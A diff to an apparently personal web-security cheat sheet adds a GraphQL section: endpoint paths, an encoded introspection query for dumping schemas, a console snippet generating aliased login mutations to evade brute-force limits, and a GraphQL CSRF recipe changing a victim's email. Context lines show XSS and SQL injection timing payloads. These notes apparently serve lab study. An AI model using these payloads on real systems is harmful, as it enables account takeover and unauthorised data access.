@@ -111,6 +111,7 @@
       <li><a href="#host-header-injection">Host Header Injection</a></li>
       <li><a href="#file-path-traversal">File path traversal</a></li>
       <li><a href="#sql-injection">SQL injection</a></li>
+      <li><a href="#graphql">GraphQL</a></li>
       <li><a href="#xxe-injection">XXE injection</a></li>
       <li><a href="#cors">CORS exploitation</a></li>
       <li><a href="#websocket">WebSocket</a></li>
@@ -1891,6 +1892,58 @@ x&quot;&gt;&lt;svg%250donload%3D&quot;window%5B%27alert%27%5D(location[%27hostna
 #Finger print timebased:
 - Use concat: x'||pg_sleep(10)--
 	or stack query: x';pg_sleep(10)--
+</code></pre></div></div>
+<hr>
+
+<h3 id="graphql">GraphQL</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Enum endpoint: (also try burp content discovery)
+	/v1/explorer
+	/v1/graphiql
+	/graph
+	/graphql/console/
+	/graphql.php
+	/graphiql
+	/graphiql.php
+	/graphql
+	/api
+	/api/graphql
+	/graphql/api
+	/graphql/graphql
+	(& try to append /v1 to all the aboves)
+
+2. Enumerate Database Schema via Introspection
+	#URL encoded query to dump the database schema: (for GET request /{endpoint}?query=)
+		fragment+FullType+on+__Type+{++kind++name++description++fields(includeDeprecated%3a+true)+{++++name++++description++++args+{++++++...InputValue++++}++++type+{++++++...TypeRef++++}++++isDeprecated++++deprecationReason++}++inputFields+{++++...InputValue++}++interfaces+{++++...TypeRef++}++enumValues(includeDeprecated%3a+true)+{++++name++++description++++isDeprecated++++deprecationReason++}++possibleTypes+{++++...TypeRef++}}fragment+InputValue+on+__InputValue+{++name++description++type+{++++...TypeRef++}++defaultValue}fragment+TypeRef+on+__Type+{++kind++name++ofType+{++++kind++++name++++ofType+{++++++kind++++++name++++++ofType+{++++++++kind++++++++name++++++++ofType+{++++++++++kind++++++++++name++++++++++ofType+{++++++++++++kind++++++++++++name++++++++++++ofType+{++++++++++++++kind++++++++++++++name++++++++++++++ofType+{++++++++++++++++kind++++++++++++++++name++++++++++++++}++++++++++++}++++++++++}++++++++}++++++}++++}++}}query+IntrospectionQuery+{++__schema%0a+{++++queryType+{++++++name++++}++++mutationType+{++++++name++++}++++types+{++++++...FullType++++}++++directives+{++++++name++++++description++++++locations++++++args+{++++++++...InputValue++++++}++++}++}}
+
+	#For easier, use InQL extension: send endpoint url to InQL Scanner (for POST) [or JSON response of database scheme for GET request only]
+
+3. Bypass brute force protections:
+	#Use this to generate aliases when crafting the request in Repeater: (paste in web browser's console)
+		copy(`password1,password2,password3,passwordn`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+
+	#Send mutation in InQL Scanner to the GraphiQL: (web interface) > paste the output there.
+
+#Ref:
+	https://portswigger.net/web-security/graphql
+	https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection#enumeration
+</code></pre></div></div>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#GraphQL-based CSRF
+	- Normally, POST requests that use a content type of application/json are secure against forgery as long as the content type is validated. 
+	(because The application/json MIME type is typically sent using AJAX, which is prevented from being sent in cross-site requests by the Same-Origin Policy (SOP). Thus, to perform CSRF against a JSON endpoint, we need to either use a different MIME type, exploit a weak CORS policy, or find another means of submitting the request)
+
+	*Condition:
+		- Accept GET method request, or
+		- Accept content type: application/x-www-form-urlencoded
+
+	*Exploit:
+		- Convert request into POST request with a Content-Type of x-www-form-urlencoded (Change request method twice)
+		- Add to body: query=mutation... (copy from InQL Scanner > url encode || ex: %0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D)
+		- > like normal CSRF
 </code></pre></div></div>
 <hr>
 
